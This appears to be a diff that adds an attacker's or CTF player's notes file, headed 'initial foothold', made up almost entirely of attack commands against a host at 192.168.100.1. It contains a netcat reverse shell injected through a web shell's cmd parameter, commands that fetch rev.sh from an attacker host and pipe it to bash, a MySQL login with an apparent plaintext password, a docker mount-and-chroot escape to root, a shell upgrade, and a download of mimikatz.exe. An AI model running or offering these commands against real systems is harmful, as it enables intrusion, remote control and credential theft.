@@ -1,0 +1,20 @@
+initial foothold:
+
+/dashboard.php?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.50.108.210 4444 >/tmp/f
+
+curl -v 'http://192.168.100.1:8080/shell.php?cmd=whoami'
+
+curl -v 'http://192.168.100.1:8080/shell.php?cmd=curl http://10.50.108.210 /rev.sh|bash &'
+
+curl -v 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.108.210%2Frev.sh%7Cbash%20%26%0A'
+
+mysql -u admin -p  -h 192.168.100.1
+!123SecureAdminDashboard321!
+
+/usr/bin/docker run -v /:/mnt --rm -it ubuntu:20.04 chroot /mnt sh
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Invoke-WebRequest "http://10.50.108.210/mimikatz.exe" -outfile "mimikatz.exe"
+
+Nothingtoworry!
